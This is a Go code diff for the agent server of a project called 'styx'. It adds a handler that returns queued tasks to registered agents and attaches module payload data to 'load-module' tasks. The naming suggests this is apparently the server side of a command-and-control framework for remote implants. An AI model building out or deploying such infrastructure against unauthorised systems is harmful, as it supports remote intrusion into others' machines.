@@ -2,19 +2,21 @@ package agentsrv
 
 import (
 	"bytes"
+	"fmt"
 	"io"
 	"net/http"
 	"styx/internal/db"
+	"styx/internal/modules"
 	"styx/internal/packager"
-	"fmt"
 )
 
 type Agent struct {
-	db *db.DB
+	db      *db.DB
+	modules *modules.Registry
 }
 
-func New(db *db.DB) *Agent {
-	return &Agent{db: db}
+func New(db *db.DB, modules *modules.Registry) *Agent {
+	return &Agent{db: db, modules: modules}
 }
 
 /*
@@ -61,7 +63,7 @@ func (agent *Agent) HandleAgentSrv(w http.ResponseWriter, r *http.Request) {
 	}
 	reader := bytes.NewReader(body)
 
-	MessageID, _, err := packager.ParseIncomingMetaDataAndValidate(reader)
+	MessageID, AgentID, err := packager.ParseIncomingMetaDataAndValidate(reader)
 	if err != nil {
 		fmt.Println("[!] MetaData Failed to parse or validate")
 		http.Error(w, err.Error(), http.StatusBadRequest)
@@ -70,22 +72,34 @@ func (agent *Agent) HandleAgentSrv(w http.ResponseWriter, r *http.Request) {
 	fmt.Println("[+] Agent POSTed")
 	switch MessageID {
 	case MSG_REGISTER:
-
 		AgentInfo, err := packager.ParseRegister(reader)
 		if err != nil {
-			fmt.Println("[!] Failed Parsing register");
+			fmt.Println("[!] Failed Parsing register")
 			http.Error(w, "failed parsing", http.StatusInternalServerError)
 			return
 		}
 
 		if err := agent.db.InsertAgent(AgentInfo); err != nil {
-			fmt.Println("[!] Failed Inserting");
+			fmt.Println("[!] Failed Inserting")
 			http.Error(w, "failed parsing", http.StatusInternalServerError)
 			return
 		}
 		w.WriteHeader(http.StatusOK)
+	case MSG_GET_TASK:
+		tasks, err := agent.db.GetTasks(AgentID)
+		if err != nil {
+			fmt.Println("[!] Failed Getting tasks")
+			http.Error(w, "failed parsing", http.StatusInternalServerError)
+			return
+		}
+		for index := range tasks {
+			if tasks[index].Kind == "load-module" {
+				tasks[index].ModuleData = agent.modules.ModuleData(tasks[index].Module)
+			}
+		}
+		w.WriteHeader(http.StatusOK)
+		w.Write(packager.PackTasks(tasks))
 		return
-
 	}
 
 }
